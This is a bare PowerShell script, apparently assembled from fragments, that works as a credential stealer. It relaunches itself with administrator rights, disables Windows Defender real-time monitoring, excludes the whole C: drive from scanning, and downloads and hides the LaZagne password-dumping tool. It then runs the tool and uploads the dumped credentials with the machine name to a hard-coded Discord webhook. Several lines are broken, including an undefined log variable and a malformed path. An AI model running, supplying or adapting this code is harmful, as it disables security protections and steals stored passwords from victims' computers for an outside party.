$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$windowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
==============
$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$dir = "$env:temp\JHknfuiD"
==============
if (-not $windowsPrincipal.IsInRole($adminRole)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } | Out-String
    $arguments = $arguments.Trim()
    Start-Process powershell.exe -Verb runAs -ArgumentList "-File `"$scriptPath`" $arguments"
    exit
}
       
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\"


$url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"


$destination = "C:\LaZagne.exe"
$hide = Get-Item "$destination" -Force
$hide.attributes='Hidden'

if (Test-Path $destination) {
    Remove-Item $destination -Force
}


Invoke-WebRequest -Uri $url -OutFile $destination & "$C:\LaZagne.exe" all -vv > "$log"
curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1


if ($?) {

    Start-Process -FilePath $destination
} else {

    exit $LASTEXITCODE
}

